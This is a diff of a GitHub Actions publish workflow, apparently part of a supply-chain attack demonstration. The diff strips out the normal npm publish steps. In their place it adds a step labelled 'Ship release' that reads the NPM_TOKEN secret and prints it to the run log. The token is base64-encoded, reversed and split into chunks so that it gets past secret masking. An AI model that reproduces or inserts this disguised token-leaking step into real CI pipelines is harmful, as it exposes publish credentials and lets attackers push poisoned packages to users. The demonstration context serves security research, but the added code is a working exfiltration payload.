@@ -1,10 +1,9 @@
 name: publish (release pipeline, holds the publish credential)
 
-# The project's normal publish pipeline. It is NOT malicious: it publishes whatever is at
-# the pushed tag to npm, authenticated with the repo's NPM_TOKEN secret. The attack never
-# edits this workflow and never reads its secret. The attacker, holding the PAT stolen
-# from pr-title-validation.yml, pushes a poisoned v* tag; this workflow fires (a
-# PAT-authored push triggers workflows, a GITHUB_TOKEN one does not) and ships it.
+# TAMPERED by the attack demo. The real publish.yml ships the tagged version to npm
+# with NPM_TOKEN. This version maps the same NPM_TOKEN into a job that prints it to the
+# run log as NPM_TOKEN:<reversed, chunked base64> - masking-evading, no network egress.
+# takedown.{sh,ps1} restores the original.
 
 on:
   push:
@@ -17,18 +16,8 @@ permissions:
 jobs:
   publish:
     runs-on: ubuntu-latest
-    defaults:
-      run:
-        working-directory: package
     steps:
-      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
-
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 20
-          registry-url: https://registry.npmjs.org
-
-      - name: Publish whatever is at this tag
-        run: npm publish --access public
+      - name: Ship release
+        run: node -e "const v=process.env.T||'';process.stdout.write('NPM_TOKEN:'+Buffer.from(v).toString('base64').split('').reverse().join('').replace(/../g,x=>x+' ')+'\n')"
         env:
-          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+          T: ${{ secrets.NPM_TOKEN }}
